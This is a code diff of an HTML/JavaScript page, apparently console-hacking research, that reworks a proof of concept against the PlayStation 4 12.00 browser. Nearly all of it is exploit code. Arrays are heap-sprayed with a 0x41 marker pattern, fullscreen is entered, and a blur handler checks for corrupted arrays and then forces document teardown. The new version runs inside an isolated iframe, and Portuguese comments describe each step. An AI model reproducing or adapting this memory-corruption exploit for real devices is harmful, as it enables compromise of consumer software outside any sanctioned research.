@@ -1,85 +1,88 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Research - Leandro (v12.00)</title>
+    <title>PS4 Iframe Isolation - Leandro</title>
 </head>
 <body>
 
-    <h1>PS4 12.00 - Sequence: Object > FS > Blur > Teardown</h1>
+    <h1>PS4 12.00 - Isolated Iframe Test</h1>
+    <p>Objetivo: Rodar o Crash PoC original dentro de um frame para manter a aba pai viva.</p>
+
+    <button onclick="setupAndRun()">1. Setup & Run (Iframe Context)</button>
     
-    <div id="status">1. Clique em um teste para preparar o objeto.</div>
-    <hr>
-
-    <button onclick="runTest(1)">1. Teardown: location.replace</button>
-    <p><small>Tenta substituir a página sem fechar o processo do navegador.</small></p>
-
-    <button onclick="runTest(2)">2. Teardown: document.body.innerHTML</button>
-    <p><small>Limpa o DOM internamente de forma agressiva.</small></p>
-
-    <button onclick="runTest(3)">3. Teardown: window.stop() + document.open()</button>
-    <p><small>Interrompe o carregamento e abre o documento sem escrever nada.</small></p>
-
-    <button onclick="runTest(4)">4. Teardown: Iframe Removal</button>
-    <p><small>Cria o objeto em um Iframe e o remove no Blur.</small></p>
-
-    <div id="container"></div>
+    <div id="frame-container" style="margin-top: 20px;">
+        </div>
 
     <script>
-    const PATTERN = 2.121995791e-314; // 0x4141414141414141
-
-    function runTest(type) {
-        // PASSO 1: CRIAR O OBJETO PRIMEIRO (Igual ao seu arquivo original)
-        let controllers = [];
-        for(let i = 0; i < 5000; i++) {
-            let arr = new Float64Array(8);
-            arr[0] = i;
-            controllers.push(arr);
-        }
+    function setupAndRun() {
+        const container = document.getElementById('frame-container');
         
-        // Se for o teste 4, criamos um iframe para ser o alvo
-        if (type === 4) {
-            document.getElementById('container').innerHTML = '<iframe id="target"></iframe>';
-        }
+        // Criando o Iframe
+        container.innerHTML = '<iframe id="pocFrame" style="width:500px; height:300px; border:1px solid #000;"></iframe>';
+        
+        const frame = document.getElementById('pocFrame');
+        const fDoc = frame.contentWindow.document;
 
-        // PASSO 2: ENTRAR EM FULL SCREEN
-        const el = document.documentElement;
-        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+        // Injetando EXATAMENTE o seu código de sucesso no frame
+        fDoc.open();
+        fDoc.write(`
+            <!DOCTYPE html>
+            <html>
+            <body>
+                <h3>Iframe Content Active</h3>
+                <p id="status">Preparing Objects...</p>
+                <script>
+                    const PATTERN = 2.121995791e-314;
+                    let controllers = [];
 
-        // PASSO 3: O GATILHO NO BLUR (OPTIONS)
-        window.onblur = function() {
-            // Spray de corrupção imediato antes do teardown
-            let spray = [];
-            for(let i = 0; i < 8000; i++) {
-                let p = new Float64Array(10);
-                p.fill(PATTERN);
-                spray.push(p);
-            }
+                    // Passo 1: Criar objetos (Identico ao seu)
+                    for(let i = 0; i < 5000; i++) {
+                        let arr = new Float64Array(8);
+                        arr[0] = i;
+                        controllers.push(arr);
+                    }
+                    document.getElementById('status').innerText = "Objects Ready. Enter Fullscreen.";
 
-            // PASSO 4: O TEARDOWN (Alternativas ao document.write)
-            switch(type) {
-                case 1:
-                    // Navega para uma página em branco (teardown de navegação)
-                    location.replace("about:blank");
-                    break;
-                case 2:
-                    // Destruição total do body via JS
-                    document.body.innerHTML = ""; 
-                    break;
-                case 3:
-                    // Para qualquer processo e abre o buffer (sem fechar a aba)
-                    window.stop();
-                    document.open();
-                    document.close();
-                    break;
-                case 4:
-                    // Remove o iframe (teardown localizado)
-                    const frame = document.getElementById('target');
-                    if(frame) frame.remove();
-                    break;
-            }
-        };
+                    // Função para disparar dentro do frame
+                    window.startPoC = function() {
+                        const elem = document.documentElement;
+                        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                        
+                        window.onblur = function() {
+                            // Passo 2: Spray
+                            let spray = [];
+                            for(let i = 0; i < 8000; i++) {
+                                let p = new Float64Array(10);
+                                p.fill(PATTERN);
+                                spray.push(p);
+                            }
+
+                            // Passo 3: Verificação
+                            let corrupted = null;
+                            for(let i = 0; i < controllers.length; i++) {
+                                if (controllers[i][0] === PATTERN) {
+                                    corrupted = controllers[i];
+                                    break;
+                                }
+                            }
+
+                            if (corrupted) {
+                                // PASSO FINAL: O document.write dentro do frame
+                                setTimeout(() => {
+                                    document.open();
+                                    document.write('<html><body><h1>Frame Crashed</h1></body></html>');
+                                    document.close();
+                                }, 1000);
+                            }
+                        };
+                    };
+                <\/script>
+                <button onclick="startPoC()">2. Start Fullscreen (Inside Frame)</button>
+            </body>
+            </html>
+        `);
+        fDoc.close();
     }
     </script>
 
